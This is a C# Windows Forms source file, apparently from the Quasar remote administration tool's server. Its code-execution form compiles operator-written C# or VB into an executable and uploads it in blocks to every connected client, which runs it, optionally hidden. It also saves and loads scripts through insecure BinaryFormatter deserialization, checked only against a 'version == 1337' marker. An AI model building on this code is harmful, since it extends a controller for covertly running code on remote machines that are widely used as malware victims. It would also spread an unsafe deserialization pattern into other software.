using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Server.Forms {

    public partial class FrmExecuteCode : Form {

        Client[] clients;

        public FrmExecuteCode(Client[] clients) {
            InitializeComponent();
            this.clients = clients;
            fctbCSharp.Text = Properties.Resources.CodeExecuter_CSharp;
            fctbVB.Text = Properties.Resources.CodeExecuter_VB;
            Text += " - " + clients.Length + " client(s)";
        }

        private void btnResetCode_Click(object sender, System.EventArgs e) {
            switch (tcLanguage.SelectedIndex) {
                case 0: // C#
                    fctbCSharp.Text = Properties.Resources.CodeExecuter_CSharp;
                    break;
                case 1: // VB
                    fctbVB.Text = Properties.Resources.CodeExecuter_VB;
                    break;
            }
        }

        private void btnExecuteCode_Click(object sender, System.EventArgs e) {
            cbHidden.Enabled = false;
            btnExecuteCode.Enabled = false;
            lblStatus.Text = "Compiling...";
            new Thread(ExecuteThread).Start();
        }

        private void ExecuteThread() {

            // get output file
            string output = new Random().Next(11111, 55555).ToString() + ".exe";

            // call compile
            CompilerResults result = CompileCode(output);

            // check for errors
            if (result.Errors.Count > 0) {
                string message = "Found " + result.Errors.Count + " errors!\n\n";
                foreach (CompilerError error in result.Errors) {
                    message += "=== ERROR " + error.ErrorNumber + " ===\n";
                    message += "-- Line #" + error.Line + "\n";
                    message += error.ErrorText + "\n\n";
                }
                EndExecution(output, message);
                return;
            }

            // split file into pieces for transfer
            int clientNumber = 1;
            foreach (Client client in clients) {

                Invoke((MethodInvoker)(() => {
                    lblStatus.Text = "Uploading to client #" + clientNumber + "...";
                }));

                FileSplit srcFile = new FileSplit(output);
                if (srcFile.MaxBlocks < 0) {
                    EndExecution(output, string.Format("Error reading file: {0}", srcFile.LastError));
                    return;
                }

                // generate unique transfer id
                int id = FileTransfer.GetRandomTransferId();

                // upload each block
                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++) {
                    byte[] block;
                    if (srcFile.ReadBlock(currentBlock, out block)) {
                        client.SendBlocking(new DoUploadAndExecute {
                            Id = id,
                            FileName = Path.GetFileName(output),
                            Block = block,
                            MaxBlocks = srcFile.MaxBlocks,
                            CurrentBlock = currentBlock,
                            RunHidden = cbHidden.Checked
                        });
                    } else {
                        EndExecution(output, string.Format("Error reading file: {0}", srcFile.LastError));
                        return;
                    }

                }

                clientNumber++;

            }

            EndExecution(output);

        }

        private void EndExecution(string file, string error = "") {
            Invoke((MethodInvoker)(() => {
                if (File.Exists(file))
                    File.Delete(file);
                cbHidden.Enabled = true;
                btnExecuteCode.Enabled = true;
                lblStatus.Text = "Ready.";
                if (error != string.Empty)
                    MessageBox.Show(error, "Execution aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }));
        }

        private CompilerResults CompileCode(string outputPath) {

            // build references list
            int referenceCount = lbReferences.Items.Count;
            string[] references = new string[referenceCount];
            for (int i = 0; i < referenceCount; i++)
                references[i] = lbReferences.Items[i].ToString();

            // setup compiler params
            var parameters = new CompilerParameters(references, outputPath);
            parameters.GenerateExecutable = true;

            // compile
            int language = -1;
            Invoke((MethodInvoker)(() => { language = tcLanguage.SelectedIndex; }));
            switch (language) {
                case 0:
                    using (CSharpCodeProvider provider = new CSharpCodeProvider())
                        return provider.CompileAssemblyFromSource(parameters, new string[] { fctbCSharp.Text });
                case 1:
                    using (VBCodeProvider provider = new VBCodeProvider())
                        return provider.CompileAssemblyFromSource(parameters, new string[] { fctbVB.Text });
            }

            return null;

        }

        private void btnRemoveReference_Click(object sender, System.EventArgs e) {
            if (lbReferences.SelectedIndex != -1)
                lbReferences.Items.RemoveAt(lbReferences.SelectedIndex);
        }

        private void btnAddReference_Click(object sender, System.EventArgs e) {
            if (txtReference.Text != string.Empty)
                lbReferences.Items.Add(txtReference.Text);
        }

        [Serializable]
        private class cScript {
            public int version = -1;
            public string code = "";
            public List<string> references;
        }

        // credits to microsoft for their doucmentation
        // https://docs.microsoft.com/en-us/dotnet/standard/serialization/basic-serialization

        /// <summary>
        /// saves the script into the c://quasar directory
        /// </summary>
        private void saveScript() {
            System.IO.Directory.CreateDirectory("C://Quasar");

            // Build the script with existing code
            cScript script = new cScript();
            string file_name = "C://Quasar//" + script_name.Text;

            // Helps verify the file.
            script.version = 1337;

            // Seperate type naming
            switch (tcLanguage.SelectedIndex) {
                case 0: // C#
                    script.code = fctbCSharp.Text;
                    file_name += ".QuasarCS";

                    break;
                case 1: // VB
                    script.code = fctbVB.Text;
                    file_name += ".QuasarVB";
                    break;
            }
            // Store code.

            // build references list
            foreach (string s in lbReferences.Items) {
                script.references.Add(s);
            }

            // Write serialized file to disk.
            IFormatter formatter = new BinaryFormatter();
            Stream stream = new FileStream(file_name, FileMode.Create, FileAccess.Write, FileShare.None);
            formatter.Serialize(stream, script);
            stream.Close();
        }

        private cScript getScriptObj(string path) {

            cScript temp = new cScript();

            try {
                // Attempt to deseserialize
                IFormatter formatter = new BinaryFormatter();
                Stream stream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
                temp = (cScript)formatter.Deserialize(stream);
                stream.Close();
            } catch {
                // invalid file.
            }

            return temp;
        }
        /// <summary>
        ///  Fetches selected script and check the verification test
        ///  if succesfull, the script will be loaded
        /// </summary>
        private void loadScript() {

            string selected_name = ScriptList.SelectedItem.ToString();

            // Iterate all files
            DirectoryInfo d = new DirectoryInfo(@"C://Quasar");

            FileInfo[] Files = null;

            switch (tcLanguage.SelectedIndex) {
                case 0: // C#
                    Files = d.GetFiles("*.QuasarCS"); //Getting CS files
                    break;
                case 1: // VB
                    Files = d.GetFiles("*.QuasarVB"); //Getting VB files
                    break;
            }

            foreach (FileInfo file in Files) {
                // Veryify the file.
                cScript scriptFile = getScriptObj(file.FullName);

                if (verify_file(scriptFile)) {

                    if (file.Name == selected_name) {
                        // Set everything

                        lbReferences.Items.Clear();

                        foreach (string refItem in scriptFile.references) {
                            lbReferences.Items.Add(refItem);
                        }

                        switch (tcLanguage.SelectedIndex) {
                            case 0: // C#
                                fctbCSharp.Text = scriptFile.code;
                                break;
                            case 1: // VB
                                fctbVB.Text = scriptFile.code;
                                break;
                        }
                    }
                }
            }

        }

        private bool verify_file(cScript file) {
            return file.version == 1337;
        }

        /// <summary>
        /// iterates the directory of all including scripts and loads into the browser.
        /// </summary>
        private void updateScripts() {
            // Empty the list
            ScriptList.Items.Clear();

            // Iterate all files
            DirectoryInfo d = new DirectoryInfo(@"C://Quasar");

            FileInfo[] Files = null;

            switch (tcLanguage.SelectedIndex) {
                case 0: // C#
                    Files = d.GetFiles("*.QuasarCS"); //Getting CS files
                    break;
                case 1: // VB
                    Files = d.GetFiles("*.QuasarVB"); //Getting VB files
                    break;
            }

            foreach (FileInfo file in Files) {
                // Veryify the file.
                cScript scriptFile = getScriptObj(file.FullName);

                if (verify_file(scriptFile)) {
                    ScriptList.Items.Add(file.Name);
                }
            }
        }

        // save script
        private void button1_Click(object sender, EventArgs e) {
            saveScript();
            updateScripts();
        }

        // Load Script
        private void button2_Click(object sender, EventArgs e) {
            loadScript();
            updateScripts();
        }

        private void FrmExecuteCode_Load(object sender, EventArgs e) {
            updateScripts();
        }
    }

}
